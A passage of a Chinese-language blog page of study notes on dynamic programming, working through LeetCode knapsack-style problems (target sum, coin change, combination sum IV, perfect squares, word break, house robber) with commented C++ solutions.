class="comment">        3           dp[2]</span></span><br><span class="line"><span class="comment">        4           dp[1]</span></span><br><span class="line"><span class="comment">        5           dp[0]</span></span><br><span class="line"><span class="comment">    所以：</span></span><br><span class="line"><span class="comment">        dp[j] += dp[j-nums[i]]</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0] = 1; 装满背包容量为0的方法有 1种</span></span><br><span class="line"><span class="comment">    举例：</span></span><br><span class="line"><span class="comment">        nums[0,0,0,0,0] 有5个元素，都是0</span></span><br><span class="line"><span class="comment">        target=0 left=0</span></span><br><span class="line"><span class="comment">    则：</span></span><br><span class="line"><span class="comment">        总共有2^5种方法，即每个元素前面是+或者-都可，因此总共有32种方法。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> left = (sum+target)/<span class="number">2</span>;<span class="comment">//手推出来的，表示【前面符号是+的元素个数】</span></span><br><span class="line">        <span class="keyword">if</span>((sum+target)%<span class="number">2</span>==<span class="number">1</span>)<span class="comment">//这里很重要</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(target)&gt;sum)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(left+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//注意！！！！</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=left;j&gt;=nums[i];j--)&#123;</span><br><span class="line">                dp[j] += dp[j-nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="474-一和零"><a href="#474-一和零" class="headerlink" title="474 一和零"></a>474 一和零</h3><p>给你一个二进制字符串数组 strs 和两个整数 m 和 n 。<br>请你找出并返回 strs 的最大子集的长度，该子集中 最多 有 m 个 0 和 n 个 1 。<br>如果 x 的所有元素也是 y 的元素，集合 x 是集合 y 的 子集 。<br><strong>完全背包</strong>：n个物品，每种【无限个】<br>也就是说，背包中可以放 多个同一物品<br>求：将哪些物品装入背包里物品价值总和最大。<br><img src="https://img-blog.csdnimg.cn/11a651d2c9ef43549d56a4a3fb9f87a6.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  与0-1背包的区别：遍历顺序 改为【正序】，并且可以先遍历物品，也可以先遍历背包（只针对纯正的完全背包问题）*/</span></span><br><span class="line"><span class="comment">// 先遍历物品，再遍历背包</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = weight[i]; j &lt;= bagWeight ; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e83878020ff7421c85c036d490ddc86c.png"></p><h3 id="322-零钱兑换——最少物品数"><a href="#322-零钱兑换——最少物品数" class="headerlink" title="322 零钱兑换——最少物品数"></a>322 零钱兑换——最少物品数</h3><p>给你一个整数数组 coins ，表示不同面额的硬币；以及一个整数 amount ，表示总金额。<br>计算并返回可以凑成<strong>总金额所需的 最少的硬币个数</strong> 。如果没有任何一种硬币组合能组成总金额，返回 -1 。<br>你可以认为每种硬币的数量是<strong>无限的</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    物品i-硬币面额coins    背包j-总金额amount</span></span><br><span class="line"><span class="comment">    dp[i] 凑满容量为j的背包所需 【最少物品数】</span></span><br><span class="line"><span class="comment">    dp[0] = 0;</span></span><br><span class="line"><span class="comment">    dp[j] = min(dp[j],dp[j-coins[i]]+1)</span></span><br><span class="line"><span class="comment">    遍历顺序：</span></span><br><span class="line"><span class="comment">        均可，因为硬币个数 没有顺序</span></span><br><span class="line"><span class="comment">    注意判断：</span></span><br><span class="line"><span class="comment">        dp[j-coins[i]]!=INT_MAX</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=amount;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j-coins[i]&gt;=<span class="number">0</span> &amp;&amp; dp[j-coins[i]]!=INT_MAX)<span class="comment">//注意！！！</span></span><br><span class="line">                    dp[j] = <span class="built_in">min</span>(dp[j],dp[j-coins[i]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount]==INT_MAX?<span class="number">-1</span>:dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先 物品 后背包</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i];j&lt;=amount;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[j-coins[i]]!=INT_MAX)<span class="comment">//注意！！！</span></span><br><span class="line">                    dp[j] = <span class="built_in">min</span>(dp[j],dp[j-coins[i]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount]==INT_MAX?<span class="number">-1</span>:dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="518-零钱兑换-II（组合数）"><a href="#518-零钱兑换-II（组合数）" class="headerlink" title="518 零钱兑换 II（组合数）"></a>518 零钱兑换 II（组合数）</h3><p>给你一个整数数组 coins 表示不同面额的硬币，另给一个整数 amount 表示总金额。<br>请你计算并返回可以<strong>凑成总金额的硬币组合数(不同顺序算同一组合)<strong>。如果任何硬币组合都无法凑出总金额，返回 0 。<br>假设每一种面额的硬币有</strong>无限个</strong>。<br>题目数据保证结果符合 32 位带符号整数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    物品i-硬币面额coins    背包j-总金额amount</span></span><br><span class="line"><span class="comment">    dp[i] 凑满容量为j的背包的 【硬币组合数】</span></span><br><span class="line"><span class="comment">    dp[0] = 1;</span></span><br><span class="line"><span class="comment">    dp[j] += dp[j-coins[i]]</span></span><br><span class="line"><span class="comment">    新颖点：</span></span><br><span class="line"><span class="comment">        遍历顺序唯一！！！！！先物品？先背包？</span></span><br><span class="line"><span class="comment">        必须，先遍历物品，后遍历背包——&gt;组合数</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=coins[i];j&lt;=amount;j++)&#123;</span></span><br><span class="line"><span class="comment">                dp[j] += dp[j-coins[i]];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        否则，先遍历背包，后遍历物品——&gt;排列数</span></span><br><span class="line"><span class="comment">        for(int j=0;i&lt;=amount;j++)&#123;</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">                if (j-coins[i] &gt;= 0)</span></span><br><span class="line"><span class="comment">                    dp[j] += dp[j-coins[i]];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, vector&lt;<span class="keyword">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i];j&lt;=amount;j++)&#123;</span><br><span class="line">                dp[j] += dp[j-coins[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="377-组合总和-Ⅳ——排列数"><a href="#377-组合总和-Ⅳ——排列数" class="headerlink" title="377 组合总和 Ⅳ——排列数"></a>377 组合总和 Ⅳ——排列数</h3><p>给你一个由 不同 整数组成的数组 nums ，和一个目标整数 target 。请你从 nums 中找出并返回总和为 target 的元素组合的个数。<br>题目数据保证答案符合 32 位整数范围。<br><strong>请注意，顺序不同的序列被视作不同的组合。</strong><br>本题求的是排列总和，而且仅仅是求排列总和的个数，并不是把所有的排列都列出来。<br>如果本题要把排列都列出来的话，只能使用回溯算法爆搜。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    元素nums[i]-物品    背包容量j  target</span></span><br><span class="line"><span class="comment">    dp[i]  总和是j 的【组合个数】</span></span><br><span class="line"><span class="comment">    dp[0] = 1;</span></span><br><span class="line"><span class="comment">    dp[j] += dp[j-nums[i]] </span></span><br><span class="line"><span class="comment">    遍历顺序：该题是【排列】</span></span><br><span class="line"><span class="comment">        先背包，后物品</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">combinationSum4</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=target;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j-nums[i]&gt;=<span class="number">0</span> &amp;&amp; dp[j]&lt;INT_MAX-dp[j-nums[i]])</span><br><span class="line">                    dp[j] += dp[j-nums[i]]; </span><br><span class="line">                <span class="comment">//溢出条件判断：C++测试用例有两个数相加超过int的数据</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279 完全平方数"></a>279 完全平方数</h3><p>给你一个整数 n ，返回 和为 n 的<strong>完全平方数的最少数量</strong> 。<br>完全平方数 是一个整数，其值等于另一个整数的平方；换句话说，其值等于一个整数自乘的积。例如，1、4、9 和 16 都是完全平方数，而 3 和 11 不是。</p><pre><code>输入：n = 13输出：2解释：13 = 4 + 9</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：完全平方数1,4,9,16,...【无限使用】【完全背包】</span></span><br><span class="line"><span class="comment">    背包容量：n(题目给的)</span></span><br><span class="line"><span class="comment">    dp[i]：和为 n 的 完全平方数的【最少数量】</span></span><br><span class="line"><span class="comment">    要求最小数量，所以初始化INT_MAX</span></span><br><span class="line"><span class="comment">    dp[0]=0;</span></span><br><span class="line"><span class="comment">    dp[j] = min(dp[j],dp[j-i*i]+1)</span></span><br><span class="line"><span class="comment">    注意：任何一个正整数都可以使用完全平方数 凑成，因为再怎么样都使用1也能凑够。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,INT_MAX)</span></span>;<span class="comment">//初始为 最大值，因为最后要求最小值</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n;j++)&#123;<span class="comment">//背包</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i*i&lt;=j;i++)&#123;<span class="comment">//物品-完全平方数：从1开始</span></span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j],dp[j-i*i]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];<span class="comment">//一定会拼凑成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 版本二</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i * i &lt;= n; i++) &#123; <span class="comment">//物品</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt;= n; j++) &#123; <span class="comment">//背包</span></span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j - i * i] + <span class="number">1</span>, dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="139-单词拆分"><a href="#139-单词拆分" class="headerlink" title="139 单词拆分"></a>139 单词拆分</h3><p>给你一个字符串 s 和一个字符串列表 wordDict 作为字典。请你判断是否可以利用字典中出现的单词拼接出 s 。<br>注意：不要求字典中出现的单词全部都使用，并且字典中的单词<strong>可以重复使用</strong>。</p><p>示例 1：</p><pre><code>输入: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;]输出: true解释: 返回 true 因为 &quot;leetcode&quot; 可以由 &quot;leet&quot; 和 &quot;code&quot; 拼接成。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：单词字典中的单词wordDict[] 【多次】【完全背包】</span></span><br><span class="line"><span class="comment">    背包：字符串s</span></span><br><span class="line"><span class="comment">    【排列数】：因为顺序不同 组成的 最终字符串不同</span></span><br><span class="line"><span class="comment">    dp[j] 组成字符串长度是j[背包]的  结果：true or false</span></span><br><span class="line"><span class="comment">    先全部初始为 false</span></span><br><span class="line"><span class="comment">    dp[0]=true; </span></span><br><span class="line"><span class="comment">    if(dp[j-worDist[i]]==true &amp;&amp; j-i)</span></span><br><span class="line"><span class="comment">        dp[j] = true;</span></span><br><span class="line"><span class="comment">    substr(起始位置，截取的个数)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;string&gt; seet;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;wordDict.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            seet.<span class="built_in">insert</span>(wordDict[i]);<span class="comment">//装入 set，便于 后序find</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">bool</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;<span class="comment">//背包 长度 1~n</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=j;i++)&#123;<span class="comment">//物品 长度 0~j</span></span><br><span class="line">                <span class="keyword">if</span>(dp[i]==<span class="literal">true</span> &amp;&amp; seet.<span class="built_in">find</span>(s.<span class="built_in">substr</span>(i,j-i))!=seet.<span class="built_in">end</span>())</span><br><span class="line">                    dp[j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198 打家劫舍"></a>198 打家劫舍</h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。<br>给定一个代表每个房屋存放金额的[非负整数数组]，计算你 不触动警报装置的情况下 ，<strong>一夜之内能够偷窃到的最高金额</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：nums[]每个房屋【现金】【一个房间一次】</span></span><br><span class="line"><span class="comment">    背包：</span></span><br><span class="line"><span class="comment">    求【最高金额】</span></span><br><span class="line"><span class="comment">    dp[j] 考虑下标j（包括j）以内的房屋，【最多可以偷窃的金额】</span></span><br><span class="line"><span class="comment">    限制条件：</span></span><br><span class="line"><span class="comment">        偷窃房屋不能相邻</span></span><br><span class="line"><span class="comment">    dp[j]=max(dp[j-2]+nums[i],dp[j-1])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,<span class="number">0</span>)</span></span>; </span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)<span class="comment">//由于下面 显式的写出了初始化dp[0]和dp[1]所以这里必须做出提前判断</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];   </span><br><span class="line">        dp[<span class="number">1</span>]=<span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;n;j++)&#123;<span class="comment">//从2开始        </span></span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j<span class="number">-2</span>]+nums[j], dp[j<span class="number">-1</span>]);</span><br><span class="line">            <span class="comment">//偷当前房间：考虑j-2  不偷当前房间：考虑j-1</span></span><br><span class="line">            <span class="comment">//（注意：是考虑，并不是一定要偷i-1房，这是很多同学容易混淆的点）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="213-打家劫舍-II"><a href="#213-打家劫舍-II" class="headerlink" title="213 打家劫舍 II"></a>213 打家劫舍 II</h3><p><strong>所有的房屋都 围成一圈</strong> ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，<strong>相邻</strong>的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。<br>计算能够<strong>偷窃到的最高金额</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 